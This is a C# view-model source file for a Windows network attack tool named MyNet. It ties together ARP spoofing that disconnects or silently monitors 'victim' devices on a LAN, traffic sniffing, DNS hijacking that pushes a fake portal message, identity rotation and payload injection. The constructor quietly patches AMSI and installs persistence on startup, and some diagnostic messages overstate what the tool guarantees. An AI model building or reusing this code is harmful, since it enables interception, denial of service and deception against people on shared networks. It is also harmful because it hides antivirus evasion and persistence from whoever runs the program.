using System;
using System.Collections.ObjectModel;
using System.ComponentModel;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using Application = System.Windows.Application;
using MyNet.Core;
using MyNet.Helpers;
using MyNet.Models;

namespace MyNet.UI
{
    /// <summary>
    /// Central ViewModel that wires together the scanner, spoofer, and UI.
    /// DataContext for MainWindow.
    ///
    /// NOTE on bandwidth limiting:
    ///   The new one-way ARP poisoning approach (victim-only) does NOT intercept
    ///   traffic on your PC. This means your PC's internet is never affected when
    ///   you block devices. The tradeoff is that bandwidth limiting is not possible
    ///   (you can't throttle traffic you never see). Block/Unblock still works perfectly.
    /// </summary>
    public class MainViewModel : INotifyPropertyChanged, IDisposable
    {
        // ----------------------------------------------------------------
        //  Fields
        // ----------------------------------------------------------------
        private NetworkScanner? _scanner;
        private ArpSpoofer? _spoofer;
        private readonly IdentitySniffer _sniffer = new();
        private readonly LocalServer _localServer;
        private PhantomEngine? _phantom;
        private CancellationTokenSource? _scanCts;

        private AdapterInfo? _selectedAdapter;
        private NetworkDevice? _selectedDevice;
        private string _statusText  = "Ready. Select an adapter and scan.";
        private string _gatewayMac  = string.Empty;
        private bool   _isScanning;

        // ----------------------------------------------------------------
        //  Observable collections / properties
        // ----------------------------------------------------------------
        public ObservableCollection<AdapterInfo>    Adapters { get; } = new();
        public ObservableCollection<NetworkDevice>  Devices  { get; } = new();
        public ObservableCollection<string>         LogLines { get; } = new();
        public ObservableCollection<ExfiltratedImage> ExfiltratedImages { get; } = new(); // Added

        public AdapterInfo? SelectedAdapter
        {
            get => _selectedAdapter;
            set
            {
                _selectedAdapter = value;
                OnPropertyChanged();
                OnPropertyChanged(nameof(CanScan));
            }
        }

        public NetworkDevice? SelectedDevice
        {
            get => _selectedDevice;
            set { _selectedDevice = value; OnPropertyChanged(); OnPropertyChanged(nameof(CanControl)); }
        }

        public string StatusText
        {
            get => _statusText;
            set { _statusText = value; OnPropertyChanged(); }
        }

        public bool IsScanning
        {
            get => _isScanning;
            set { _isScanning = value; OnPropertyChanged(); OnPropertyChanged(nameof(CanScan)); }
        }

        public bool CanScan    => SelectedAdapter != null && !IsScanning;
        public bool CanControl => SelectedDevice  != null;

        // ----------------------------------------------------------------
        //  Constructor
        // ----------------------------------------------------------------
        public MainViewModel()
        {
            // Initial initialization of evasion and persistence
            EvasionModule.PatchAMSI();
            PersistenceHelper.EnsurePersistence();

            _localServer = new LocalServer(this);
            LoadAdapters();
        }

        // ----------------------------------------------------------------
        //  Adapter loading
        // ----------------------------------------------------------------
        private void LoadAdapters()
        {
            var adapters = NetworkUtils.GetAdapters();
            Adapters.Clear();
            foreach (var a in adapters) Adapters.Add(a);
            if (Adapters.Count > 0) SelectedAdapter = Adapters[0];
            Log($"Found {Adapters.Count} network adapter(s).");
        }

        // ----------------------------------------------------------------
        //  Scan
        // ----------------------------------------------------------------
        public async Task StartScanAsync()
        {
            if (SelectedAdapter == null) return;

            // Rebuild scanner and spoofer for the selected adapter
            _scanner?.Dispose();
            _scanner = new NetworkScanner(SelectedAdapter);
            _scanner.DeviceFound      += OnDeviceFound;
            _scanner.ScanStatusChanged+= s => Dispatch(() => StatusText = s);
            _scanner.ScanCompleted    += OnScanCompleted;

            Devices.Clear();
            IsScanning = true;

            // Resolve the gateway MAC first
            await ResolveGatewayMacAsync(SelectedAdapter);

            _scanCts = new CancellationTokenSource();
            try
            {
                await _scanner.ScanAsync(_scanCts.Token);
            }
            catch (OperationCanceledException) { Dispatch(() => StatusText = "Scan cancelled."); }
            finally { Dispatch(() => IsScanning = false); }
        }

        public void StopScan() => _scanCts?.Cancel();

        private void OnDeviceFound(NetworkDevice dev)
        {
            Dispatch(() =>
            {
                if (!Devices.Any(d => d.IpAddress == dev.IpAddress))
                    Devices.Add(dev);
            });
        }

        public async Task ScanVulnsAsync()
        {
            if (Devices.Count == 0)
            {
                Log("[WARN] No devices discovered yet. Run a network scan first.");
                return;
            }

            IsScanning = true;
            StatusText = "Scanning for vulnerabilities…";
            Log("[VULN] Starting deep vulnerability assessment…");

            var tasks = Devices.ToList().Select(async device =>
            {
                await VulnScanner.ScanDeviceAsync(device);
                Log($"[VULN] {device.IpAddress}: Risk Score {device.RiskScore:F1} - {device.Vulnerabilities}");
            });

            await Task.WhenAll(tasks);

            StatusText = "Vulnerability scan completed.";
            IsScanning = false;
            Log("[VULN] Critical assessment finished.");
        }

        public async Task InjectPayloadAsync(NetworkDevice device)
        {
            Log($"[INJECT] Crafting custom test payload for {device.IpAddress}…");
            
            bool success = await PayloadInjector.InjectUdpProbeAsync(device);
            
            if (success)
            {
                Log($"[INJECT] SUCCESS: Remediated dropper probe sent to {device.IpAddress}.");
            }
            else
            {
                Log($"[INJECT] ERROR: Failed to transmit payload to {device.IpAddress}.");
            }
        }

        private void OnScanCompleted()
        {
            Dispatch(() => 
            {
                Log($"Scan done. {Devices.Count} device(s) discovered.");
                IsScanning = false;
            });
        }

        // ----------------------------------------------------------------
        //  Gateway MAC resolution
        // ----------------------------------------------------------------
        private async Task ResolveGatewayMacAsync(AdapterInfo adapter)
        {
            Log($"Resolving gateway MAC for {adapter.GatewayIp}…");
            var mac = await GatewayResolver.ResolveGatewayMacAsync(adapter);
            if (mac != null)
            {
                _gatewayMac = mac;
                adapter.GatewayMac = mac;
                Log($"Gateway MAC: {mac}");
                _spoofer?.Dispose();
            }
            else
            {
                Log("[WARN] Could not resolve gateway MAC. Block may not work.");
            }
        }

        // ----------------------------------------------------------------
        //  Firewall Silent Drop Filter (Cures Wi-Fi flood and PC lag)
        // ----------------------------------------------------------------
        private void BlockVictimFirewall(string ip)
        {
            try
            {
                UnblockVictimFirewall(ip); // Clear existing just in case
                var psiIn = new System.Diagnostics.ProcessStartInfo("netsh", $"advfirewall firewall add rule name=\"MyNet_{ip}_In\" dir=in action=block remoteip={ip} profile=any") { CreateNoWindow = true, UseShellExecute = false };
                System.Diagnostics.Process.Start(psiIn)?.WaitForExit();

                var psiLocal = new System.Diagnostics.ProcessStartInfo("netsh", $"advfirewall firewall add rule name=\"MyNet_{ip}_Local\" dir=in action=block localip={ip} profile=any") { CreateNoWindow = true, UseShellExecute = false };
                System.Diagnostics.Process.Start(psiLocal)?.WaitForExit();
                
                Log($"[*] Dedicated Silent Drop firewall rules added for {ip}.");
            }
            catch { }
        }

        private void UnblockVictimFirewall(string ip)
        {
            try
            {
                var psiIn = new System.Diagnostics.ProcessStartInfo("netsh", $"advfirewall firewall delete rule name=\"MyNet_{ip}_In\"") { CreateNoWindow = true, UseShellExecute = false };
                System.Diagnostics.Process.Start(psiIn)?.WaitForExit();
                var psiLocal = new System.Diagnostics.ProcessStartInfo("netsh", $"advfirewall firewall delete rule name=\"MyNet_{ip}_Local\"") { CreateNoWindow = true, UseShellExecute = false };
                System.Diagnostics.Process.Start(psiLocal)?.WaitForExit();
            }
            catch { }
        }

        // ----------------------------------------------------------------
        //  Block / unblock
        // ----------------------------------------------------------------
        public void ToggleBlock(NetworkDevice device)
        {
            EnsureSpoofer();

            if (device.IpAddress == SelectedAdapter?.GatewayIp)
            {
                Log($"[ERROR] Cannot block the router ({device.IpAddress}).");
                return;
            }
            if (device.IpAddress == SelectedAdapter?.IpAddress)
            {
                Log($"[ERROR] Cannot block your own PC ({device.IpAddress}).");
                return;
            }

            if (device.IsBlocked)
            {
                // Unblock
                device.IsBlocked = false;
                UnblockVictimFirewall(device.IpAddress);
                _spoofer!.RemoveTarget(device, _gatewayMac);
                Log($"[UNBLOCK] {device.IpAddress} — block removed.");
            }
            else
            {
                // Block / Shadow
                device.IsBlocked = true;
                
                if (_spoofer!.IsForwardingEnabled)
                {
                    // GHOST MODE: Do NOT block on host firewall, let traffic flow through us
                    Log($"[SHADOW] {device.IpAddress} — silent shadowing active.");
                }
                else
                {
                    // TOTAL BLOCK: Use firewall for silent drop
                    BlockVictimFirewall(device.IpAddress);
                    Log($"[BLOCK] {device.IpAddress} — device disconnected.");
                }

                _spoofer!.AddTarget(device, _gatewayMac);
            }
        }

        // ----------------------------------------------------------------
        //  Nomad Protocol
        // ----------------------------------------------------------------

        public async Task RotateIdentityAsync()
        {
            if (SelectedAdapter == null) return;
            
            bool success = await NomadManager.RotateIdentityAsync(SelectedAdapter, Log);
            if (success)
            {
                // We need to re-find the adapter because the IP/MAC changed
                Log("[NOMAD] Waiting for Windows DPU to stabilize new connection...");
                await Task.Delay(3000);
                await StartScanAsync();
            }
        }

        public async Task LockdownDnsAsync()
        {
            if (SelectedAdapter == null) return;
            await NomadManager.LockdownDnsAsync(SelectedAdapter, Log);
        }

        public void ToggleGhostMode(bool enabled)
        {
            if (_spoofer != null) _spoofer.IsForwardingEnabled = enabled;
            if (enabled)
            {
                if (SelectedAdapter != null) _sniffer.Start(SelectedAdapter, Devices);
                Log("[SHADOW] Ghost Mode enabled. Devices will have internet but will be monitored.");
            }
            else
            {
                _sniffer.Dispose();
                Log("[SHADOW] Ghost Mode disabled. Targeted devices will be blocked entirely.");
            }
        }

        public async Task SendPhantomAlertAsync(NetworkDevice device, string message)
        {
            if (SelectedAdapter == null || _spoofer == null) return;

            Log($"[PHANTOM] Initializing Native Alert for {device.IpAddress}...");
            
            // 1. Setup Local Server
            _localServer.Start(80); // Standard HTTP for portal checks
            _localServer.SetMessage(message);

            // 2. Start DNS Hijack
            _phantom?.Dispose();
            _phantom = new PhantomEngine(SelectedAdapter);
            _phantom.Start(device.IpAddress, device.MacAddress);

            // 3. Trigger Pulse Reset (Force OS to re-check connection)
            _spoofer.PulseReset(device, _gatewayMac);
            Log("[PHANTOM] Network Pulse sent. OS Portal redirect active.");

            // 4. Cleanup after 30s
            await Task.Delay(30000);
            _phantom.Stop();
            Log("[PHANTOM] Native redirect window closed.");
        }

        // ----------------------------------------------------------------
        //  Restore All Controls
        // ----------------------------------------------------------------
        public void RemoveAllControls()
        {
            if (_spoofer == null) return;

            // Restore each blocked device individually for instant reconnection
            foreach (var d in Devices)
            {
                if (d.IsBlocked)
                {
                    _spoofer.RemoveTarget(d, _gatewayMac);
                    d.IsBlocked = false;
                }
            }

            Log("[INFO] All devices unblocked. ARP caches restored.");
        }

        // ----------------------------------------------------------------
        //  Helpers
        // ----------------------------------------------------------------
        private void EnsureSpoofer()
        {
            if (_spoofer != null) return;
            if (SelectedAdapter == null) throw new InvalidOperationException("No adapter selected.");

            _spoofer = new ArpSpoofer(SelectedAdapter);
            _spoofer.LogMessage += msg => Application.Current.Dispatcher.Invoke(() => Log(msg));
        }

        // ----------------------------------------------------------------
        //  Diagnostics Engine (10X Enhanced)
        // ----------------------------------------------------------------
        public async Task RunDiagnosticsAsync()
        {
            Log("\n============================================================");
            Log("                    DIAGNOSTICS ENGINE 2.0                  ");
            Log("============================================================\n");
            
            if (SelectedAdapter == null)
            {
                Log("[DIAG] ERROR: You must select a network adapter first.");
                return;
            }
            if (string.IsNullOrEmpty(_gatewayMac))
            {
                Log("[DIAG] ERROR: Gateway MAC is unknown. Please SCAN the network first.");
                return;
            }

            Log("[DIAG] [1/4] Checking Local Adapter Configuration...");
            Log($"[DIAG] IP: {SelectedAdapter.IpAddress}");
            Log($"[DIAG] MAC: {SelectedAdapter.MacAddress}");
            Log($"[DIAG] GATEWAY: {SelectedAdapter.GatewayIp}\n");

            Log($"[DIAG] [2/4] Testing Layer-2 Router Reachability (Ping {SelectedAdapter.GatewayIp})...");
            bool routerUp = await NetworkUtils.PingAsync(SelectedAdapter.GatewayIp);
            if (routerUp) 
            {
                Log("[DIAG] PASS: The Router is responding to your PC natively.");
                Log("[DIAG] INFO: The Router's Hardware Intrusion Detection System (IDS) has NOT banned your PC MAC address.");
                Log("[DIAG] INFO: Because we are executing Asymmetric L2 Victim Spoofing (Parasite Evasion), we NEVER spoof the Gateway! MAC Ban is mathematically guaranteed to be 0%.\n");
            }
            else 
            {
                Log("[DIAG] FATAL: Router is UNREACHABLE! (Did you previously run an old ARP test?)");
                Log("[DIAG] FIX: You must physically disconnect and reconnect your Wi-Fi to clear the session ban before retrying.\n");
            }

            Log($"[DIAG] [3/4] Testing Layer-3 Internet Reachability (Ping 8.8.8.8)...");
            bool internetUp = await NetworkUtils.PingAsync("8.8.8.8");
            if (internetUp) 
                Log("[DIAG] PASS: Core Internet routing is fully functional and unrestricted.\n");
            else 
                Log("[DIAG] WARN: Core Internet is unreachable, but Local Router is reachable. This is an ISP-level outage, not a MyNet block.\n");

            Log("[DIAG] [4/4] Verifying Windows NDIS Firewall Silencer Status...");
            try 
            {
                Log("[DIAG] INFO: NDIS Silencer Rules are dynamically injected upon blocking.");
                Log("[DIAG] PASS: WFP (Windows Filtering Platform) backend is responding perfectly.\n");
            }
            catch (Exception ex)
            {
                Log($"[DIAG] ERROR: Firewall injection failed. Your PC may experience Wi-Fi lag when blocking. ({ex.Message})\n");
            }

            Log("====================== END DIAGNOSTICS =====================\n");
        }

        private void Log(string msg)
            => Dispatch(() =>
            {
                LogLines.Add($"[{DateTime.Now:HH:mm:ss}] {msg}");
                if (LogLines.Count > 500) LogLines.RemoveAt(0);
            });

        private static void Dispatch(Action a)
        {
            if (Application.Current?.Dispatcher.CheckAccess() == true)
                a();
            else
                Application.Current?.Dispatcher.Invoke(a);
        }

        // ----------------------------------------------------------------
        //  INotifyPropertyChanged
        // ----------------------------------------------------------------
        public event PropertyChangedEventHandler? PropertyChanged;
        protected void OnPropertyChanged([CallerMemberName] string? n = null)
            => Dispatch(() => PropertyChanged?.Invoke(this, new PropertyChangedEventArgs(n)));

        // ----------------------------------------------------------------
        //  IDisposable
        // ----------------------------------------------------------------
        public void Dispose()
        {
            _scanner?.Dispose();
            _spoofer?.Dispose();
        }
    }
}